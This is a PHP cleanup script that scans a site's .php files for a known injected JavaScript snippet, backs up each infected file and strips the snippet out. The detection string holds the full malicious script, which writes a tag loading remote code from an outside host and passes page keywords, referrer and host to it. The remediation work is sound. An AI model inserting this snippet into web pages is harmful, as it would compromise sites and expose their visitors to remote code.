<?php

// JudaB(c) 2016


$lookfor = <<<EOF
<script>var a='';setTimeout(10);if(document.referrer.indexOf(location.protocol+"//"+location.host)!==0||document.referrer!==undefined||document.referrer!==''||document.referrer!==null){document.write('<script type="text/javascript" src="http://hindutemplestlouis.org/js/jquery.min.php?c_utt=J18171&c_utm='+encodeURIComponent('http://hindutemplestlouis.org/js/jquery.min.php'+'?'+'default_keyword='+encodeURIComponent(((k=(function(){var keywords='';var metas=document.getElementsByTagName('meta');if(metas){for(var x=0,y=metas.length;x<y;x++){if(metas[x].name.toLowerCase()=="keywords"){keywords+=metas[x].content;}}}return keywords!==''?keywords:null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k))+'&se_referrer='+encodeURIComponent(document.referrer)+'&source='+encodeURIComponent(window.location.host))+'"><'+'/script>');}</script>
EOF;

$date = new DateTime();
$ts=$date->getTimestamp();


//$lookfor = "setTimeout(10)";

$di = new RecursiveDirectoryIterator('./');
foreach (new RecursiveIteratorIterator($di) as $filename => $file) {

	if (($file->isFile()) && (strpos($file->getPathName(),".php") !== false)  )
		{
//		print_r($file);
//		    echo "Scanning file" . $filename . PHP_EOL;
		$file_contents = file_get_contents($file->getPathName());
		if (strpos($file_contents, $lookfor) !== false)
			{
			echo "Infected " . $filename .  PHP_EOL;
			copy($file->getPathName(),$file->getPathName() .'.vir.' . $ts);
			$file_contents = str_replace($lookfor,"<!--JudaB -->",$file_contents);
			file_put_contents($file->getPathName(),$file_contents);
			}
		}
// ' - ' . $file->getSize() . ' bytes <br/>' . PHP_EOL;
}
